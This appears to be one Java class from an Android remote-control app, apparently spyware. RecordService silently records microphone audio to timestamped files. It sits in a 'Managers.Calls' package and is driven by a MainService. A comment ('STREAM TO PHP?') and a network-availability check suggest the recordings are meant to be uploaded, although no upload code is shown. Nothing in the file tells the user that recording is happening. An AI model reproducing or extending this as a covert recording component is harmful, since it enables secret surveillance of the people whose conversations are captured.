package com.remote.app.Managers.Calls;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.lang.Exception;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;


import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.app.Service;
import android.preference.PreferenceManager;
import android.util.Base64;
import android.util.Log;
import android.content.SharedPreferences;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;

import com.remote.app.MainService;

public class RecordService extends Service implements MediaRecorder.OnInfoListener, MediaRecorder.OnErrorListener
{
    
    private MediaRecorder recorder = null;
    private File recording = null;;
	
    private File makeOutputFile ()
    {
    	
 		
        File dir = MainService.OpenFile(8);

        if (!dir.exists()) {
            try {
                dir.mkdirs();
            } catch (Exception e) {
                return null;
            }
        } else {
            if (!dir.canWrite()) {
                return null;
            }
        }
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH_mm");
        String currentDateandTime = sdf.format(new Date());

        try {
            return File.createTempFile(currentDateandTime, ".mpg", dir);
        } catch (IOException e) {
            return null;
        }
    }

    public void onCreate()
    {
        super.onCreate();
        recorder = new MediaRecorder();
    }

    public void onStart(Intent intent, int startId) {

        if (MainService.isRecording) return;

        Context c = getApplicationContext();
        
        int audiosource = 1; 
        int audioformat = 1; 

        recording = makeOutputFile();
        if (recording == null) {
            recorder = null;
            return;
        }

        try {
            recorder.reset();
            recorder.setAudioSource(audiosource);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(recording.getAbsolutePath());
            recorder.setOnInfoListener(this);
            recorder.setOnErrorListener(this);
            
            //STREAM TO PHP? //Alert
            
            try {
                recorder.prepare();
            } catch (IOException e) {
                recorder = null;
                return; 
            }            
            recorder.start();
            MainService.isRecording = true;
            
			

        } catch (Exception e) {
            recorder = null;
        }

        return;
    }

    public void onDestroy()
    {
        super.onDestroy();

        if (null != recorder) {
            MainService.isRecording = false;
            recorder.release();
        }
    }


    public IBinder onBind(Intent intent)
    {
        return null;
    }

    public boolean onUnbind(Intent intent)
    {
        return false;
    }

    public void onRebind(Intent intent)
    {
    }


    // MediaRecorder.OnInfoListener
    public void onInfo(MediaRecorder mr, int what, int extra)
    {
        MainService.isRecording = false;
    }

    // MediaRecorder.OnErrorListener
    public void onError(MediaRecorder mr, int what, int extra) 
    {
        MainService.isRecording = false;
        mr.release();
    }
    

    //********************************************************************************************************************************************************
    public boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            return true;
        }
        return false;
    } 
}
